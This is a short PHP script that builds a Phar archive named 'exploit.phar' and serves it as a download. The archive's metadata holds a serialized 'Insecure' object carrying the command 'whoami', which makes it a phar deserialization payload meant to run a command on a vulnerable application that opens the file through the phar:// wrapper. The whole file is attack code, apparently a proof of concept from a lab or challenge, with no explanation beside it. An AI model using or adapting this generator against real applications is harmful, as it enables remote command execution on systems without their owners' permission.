<?php
class Insecure {

    private $command;

    public function __construct($command)
    {
        $this->command = $command;
    }

    public function __sleep() {
        return ["command"];
    }
}
$name = 'exploit.phar';
$sploit_file = new Insecure("whoami");
$phar = new Phar($name);
$phar->startBuffering();
$phar->addFromString("test.txt", "test");
$phar->setMetadata($sploit_file);
// var_dump($phar->stream_get_meta_data);
$phar->stopBuffering();
header('Content-Description: File Transfer');
header('Content-Type: application/octet-stream');
header('Content-Disposition: attachment; filename="' . basename($name) . '"');
header('Content-Length: ' . filesize($name));
header('Cache-Control: no-cache, must-revalidate');
header('Pragma: public');

readfile($name);
?>